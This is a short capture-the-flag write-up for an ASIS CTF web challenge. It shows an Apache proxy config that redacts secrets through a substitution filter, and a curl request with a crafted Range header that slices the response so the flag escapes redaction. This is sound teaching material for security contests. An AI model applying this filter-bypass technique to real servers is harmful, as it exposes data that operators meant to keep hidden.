#  Less secure secrets 
**Category:** Web
**points:** 71
**solves:** 70

# Description:
Let's warm up!

# Solution: 
The goal of the challenge is to get the flag inside : https://securesecrets.asisctf.com/secret.html
But the flag is removed in apache proxy configuration here:  
```
ServerName proxy

LoadModule deflate_module /usr/local/apache2/modules/mod_deflate.so
LoadModule proxy_module /usr/local/apache2/modules/mod_proxy.so
LoadModule substitute_module /usr/local/apache2/modules/mod_substitute.so
LoadModule proxy_http_module /usr/local/apache2/modules/mod_proxy_http.so

<VirtualHost *:80>
    RequestHeader unset Accept-Encoding
    ProxyPass / http://main/
    ProxyPassReverse / http://main/

    SetEnvIf X-Http-Method-Override ".+" X-Http-Method-Override=$0
    RequestHeader set X-Http-Method-Override %{X-Http-Method-Override}e env=X-Http-Method-Override

    SetEnvIf Range ".+" Range=$0
    RequestHeader set Range %{Range}e env=Range

    SetEnvIf Via ".+" Via=$0
    RequestHeader set Via %{Via}e env=Via

    SetEnvIf If-Match ".+" If-Match=$0
    RequestHeader set If-Match %{If-Match}e env=If-Match

    <if "%{REMOTE_ADDR} != '127.0.0.1'">
        AddOutputFilterByType INFLATE;SUBSTITUTE;DEFLATE text/html
        Substitute s|<secret>(.*)</secret>|Protected|i
    </if>
    
    # Send apache logs to stdout and stderr
    CustomLog /proc/self/fd/1 common
    ErrorLog /proc/self/fd/2
</VirtualHost>
```

The part where it removes the secret is here : 
```
   <if "%{REMOTE_ADDR} != '127.0.0.1'">
        AddOutputFilterByType INFLATE;SUBSTITUTE;DEFLATE text/html
        Substitute s|<secret>(.*)</secret>|Protected|i
    </if>
```

The proxy foward 3 headers : 
* X-Http-Method-Override
* Range 
* Via

The interesting header is Range, making a request with range you can break the html code so that the parser doesn't work and the regex can't replace the flag with "Protected":
The solution is : 
```
$ curl -H 'Range: bytes=785-808' https://securesecrets.asisctf.com/secret.html
ASIS{L3T5_S74rT_7h3_fUn}                                                                                                                                                                                                                     ------------------------------------------------------------
```
